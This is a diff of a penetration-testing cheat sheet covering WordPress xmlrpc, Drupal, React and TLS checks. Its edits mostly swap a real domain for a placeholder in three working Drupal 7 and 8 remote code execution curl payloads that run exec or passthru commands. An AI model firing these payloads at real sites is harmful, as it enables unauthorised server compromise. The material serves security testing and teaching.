@@ -45,7 +45,7 @@ Find version
 
 List methods
 
-```raw
+```sh
 POST /xmlrpc.php HTTP/1.1
 Host: <target>
 Accept-Encoding: gzip, deflate
@@ -77,32 +77,30 @@ If there is pingback, try :
 
 ### Drupal
 
+- intruder from 0 to 500 on /node/$
+
 ```bash
-drupal , intruder from 0 to 500 on /node/$
-
 /imce
-
-Druppalgeddon 2/3
 ```
 
 POC1 drupal 8
 
 ```bash
-  curl -k -i 'https://filalapat.fr/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
+  curl -k -i '<target>/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
     --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=uname -a'
 ```
 
 POC2 drupal 8
 
 ```bash
-curl -k -i 'https://filalapat.fr/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
+curl -k -i '<target>/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
     --data 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/2'
 ```
 
 POC3 drupal 7
 
 ```bash
- curl -k -s 'http://localhost/drupal-7.55/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a' \
+ curl -k -s '<target>/drupal-7.55/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a' \
     --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id
 ```
 
@@ -129,9 +127,9 @@ creer new users INSERT INTO jos_users (name, username, password, usertype, gid, 
 
 - [React Developer Tools](https://addons.mozilla.org/fr/firefox/addon/react-devtools/) (edit props/state/hooks values)
 
-Security Testers: Inject JavaScript and JSON wherever you can and see what happens. 
+**Security Testers**: Inject JavaScript and JSON wherever you can and see what happens. 
 
-Developers: Don’t ever `useeval()` or `dangerouslySetInnerHTML`. Avoid parsing user-supplied JSON.
+**Developers**: Don’t ever `useeval()` or `dangerouslySetInnerHTML`. Avoid parsing user-supplied JSON.
 
 ---
 
@@ -221,16 +219,6 @@ Check lucky13
 
 ```bash
 openssl s_client -cipher DES-CBC3-SHA -connect xx.fr:443
-```
-
----
-
-## **SSH** 
-
-Check if 4096 key
-
-```bash
-ssh-keygen -l -f key.pub
 ```
 
 ---
